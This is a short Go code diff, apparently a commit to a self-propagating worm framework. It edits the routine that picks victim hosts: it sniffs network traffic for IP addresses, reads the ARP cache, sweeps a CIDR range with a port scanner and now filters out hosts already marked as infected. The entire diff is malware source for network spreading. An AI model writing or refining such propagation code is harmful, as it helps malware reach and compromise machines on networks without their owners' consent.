@@ -147,7 +147,7 @@ func IsHostActive(target string) bool {
 	}
 	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.scan_timeout)*time.Second, NeuraxConfig.threads)
 	opened_ports := ps.GetOpenedPort(first, last)
-	if len(opened_ports) != 0 && !IsHostInfected(target) {
+	if len(opened_ports) != 0 {
 		if NeuraxConfig.required_port == 0 {
 			return true
 		} else {
@@ -193,10 +193,10 @@ func NeuraxScan(c chan string) {
 					ip, _ := ip_layer.(*layers.IPv4)
 					source := fmt.Sprintf("%s", ip.SrcIP)
 					destination := fmt.Sprintf("%s", ip.DstIP)
-					if source != coldfire.GetLocalIp() {
+					if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
 						c <- source
 					}
-					if destination != coldfire.GetLocalIp() {
+					if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
 						c <- destination
 					}
 				}
@@ -206,7 +206,9 @@ func NeuraxScan(c chan string) {
 		targets := []string{}
 		if NeuraxConfig.read_arp_cache {
 			for ip, _ := range arp.Table() {
-				targets = append(targets, ip)
+				if !IsHostInfected(ip) {
+					targets = append(targets, ip)
+				}
 			}
 		}
 		full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.cidr)
@@ -215,7 +217,7 @@ func NeuraxScan(c chan string) {
 		}
 		targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
 		for _, target := range targets {
-			if IsHostActive(target) {
+			if IsHostActive(target) && !IsHostInfected(target) {
 				c <- target
 			}
 		}
